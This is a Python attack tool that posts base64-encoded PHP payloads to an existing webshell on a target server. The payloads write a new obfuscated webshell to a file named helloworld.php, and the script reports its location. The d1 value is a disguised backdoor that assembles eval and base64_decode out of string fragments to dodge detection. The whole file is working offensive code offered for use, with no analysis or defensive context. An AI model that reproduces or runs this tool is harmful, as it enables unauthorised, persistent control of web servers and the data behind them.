import requests
import argparse
import re
xss = "@eval(base64_decode($_POST[action]));"   
action = "JG15ZmlsZT1mb3BlbigiLi9oZWxsb3dvcmxkLnBocCIsInciKTtmd3JpdGUoJG15ZmlsZSxiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZDEnXSkpO2VjaG8gInN1Y2Nlc3MiOw=="
d1 = "PD9waHAKJHBhc3N3b3JkPSdAQHhzcyc7CiRodG1sPSckcGFzc3dvcmQnLic9Jy4iJyIuJHBhc3N3b3JkLiInOyIuJ0BlI2h0bWwnLicnLid2Jy4iIi4nJy4nJy4iIi4nJy4nJy4nJy\
4nYScuJycuJ2woJy4nZycuJycuIiIuJycuJycuJ3onLidpJy4nJy4nJy4nbicuJ2YnLidsJy4nJy4nJy4iIi4nYScuJ3QnLidlKGInLidhcycuJycuJycuJycuIiIu\
JycuJ2UnLic2Jy4nJy4iIi4nJy4iIi4iIi4iIi4nJy4nNF8nLidkJy4nZScuJ2MnLicnLicnLicnLiIiLicnLiIiLidvJy4nZCcuJ2UnLicoJy4iJ2xWWmhiNXR\
JRVAwZUtmOWhnNklDRXVmZ1hCeTFzU0kxVFRISktjWTVqSnNtYllUd3NwaXRNVXQzU1dpVCtyL2ZMTFpqak4zVXh4ZkU3c3liTjI5blp0bmRJWnd6N25PU01aN1Rk\
S1NaZW50M1J4QWhLRXQ5a1FjODErUUtqWkMyUjRVZ3ViYnY5NjErLzdMbmZGR3lPQXN5cXR6ck9ucmUzVUh3N0dOMGlsUzFQZjk2RUlRSEk1TG1jclhMbm1pU0JBZE\
hEUk5wbUUyeUlLZkRoTFJSdDM5cG9lT0cyVVkzTkExWklaRGpvVmJqVUYvaThBUVFob0VneDBkK1NEQUxpYmI2cGR3TzRuN1hkcXpoMzNmZHJ2blA0NjBaMnVGaHgzTStmN\
kREVDltaGQ1RzVvZG42Nk55MDRrL044YnZ6MGVtcG91dVZDQTRwNmpHVXE2Y1AxME03aVlPbWV4bDhkdjd0MlhIUnRUdGpiSTlhMk80VWdUZmcrTnRkY25zNExtNjl1QlhjW\
lBuZFUvSkliS2ZvM1RnOG5NU1RxMEpHbWdlU1FrWVBLYzZsdnVRSEZiblExRWd3UEdZWlNkV2xraVdyaEtaalNEd0x1Q0ErVU5Ra3p3VlVhZkg5Z2ZDZllGS2FmbEZCMDFpOXJ4c\
kVURWoxUmM1emxyQ0NjRzF1S2pmVSt4V3dLQVBMRnpKYTZXdWd0NmFCOXFGT1VqWjdBNVNCbW1iVlUyWUYzaXZrUzBUMklJTXJ0dVdoZytjWjJTbTY4THpyZzJiRC9NcS9wa3A3ZzBjR\
FhDNGc5Z2w2TGpsTVg3VWNRSkg5ZFNhcjdBVDkveHA3RmZxY3BTa3B6K29FblNkTUVHbTl5U01xT00ySjFNQW92ZlU2SWsxakVvU0VneHJOK2g1bWFRN3NoVlNxRGx6RU5DSFFleEZoVV\
NueG1zYUxRaUh5N0VZRTZxbGtjV1MrTzY2emVEbXFKWnRUWkc1RVhDWFdtQlVZMllBMy9WT0lOMitRTnVjSCtZRjA2TmN2VkZtUWF1cS81MUFSenZ4eitOcG5oT1dobGJxdGlTNmJacEZ\
nWlhPT01GMjI2eDRVZk1aQVZtd3M1b1F1czFwcll3eWJQazFwcnI2eVQzNFFYRzl6SEFPWkYyK3R5clZjaGJITE1waThPRGJRK2NDOTZsMTdQcnhtZExheTlpNjdWbS9nUWQrMnRySjNM\
Vy9nT3A1NzV2UTdsbXNnengxWTI5SHFXKzZaYlRtZVVabitLME1HTDNLVlNram5OZHo1b1MxM3RqZ01FTTZINHRmVUlJRXBKMmVsSDIyYXFEbVpaTExSM2tmUVYydmp0SXdBRnZsUG\
JXYXA2eHZLNWoyZFpJbThIbFRWbUNPdWdWUm9LaUZKUGxKK2xvWWRpS2xzaHBSMFpBTCtvaVJYdUZVRTJKVC9IalJTRkNTQzFNcHFOdmZsN1o0RWVKWXQyQU1qQlp6eHlxbXNYK3JnU\
EhxaWFaUUVlZjJ5QmQ4S3MrbnM5MkNMdndQeUdDUWJMUUJzK2g4PScpKSk7IjskY3NzPWJhc2U2NF9kZWNvZGUoIlEzSmxZWFJsWDBaMWJtTjBhVzl1Iik7JHN0eWxlPSRjc3MoJy\
cscHJlZ19yZXBsYWNlKCIvI2h0bWwvIiwiIiwkaHRtbCkpOyRzdHlsZSgpOy8qKSk7Lic8bGlua3JlbD0ic3R5bGVzaGVldCJocmVmPSIkI2NzcyIvPic7Ki8K"
payload = {'xss' : xss , 'action' : action , 'd1': d1}

def attackPayload(hostName):
    pattern = re.compile(r'.*(success).*')
    try:
        headers = {'User-Agent':"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"}
        resp = requests.post(hostName,data = payload,headers = headers)
        # print(resp.text)
        if pattern.findall(resp.text):
            print("[+] WebShell Write Successfully")
            num = hostName.rfind('/')
            print("[+] WebShell Location : {0}helloworld.php".format(hostName[:num+1]))
    except Exception as e:
        print("[-] WebShell Write Failed!")
def main():
    parser = argparse.ArgumentParser(usage="python3 -u webshell location",description="Webshell Write tool")
    parser.add_argument('-u',help="Your Webshell location")
    args = parser.parse_args()
    xiaoma = args.u
    attackPayload(xiaoma)

if __name__ == "__main__":
    main()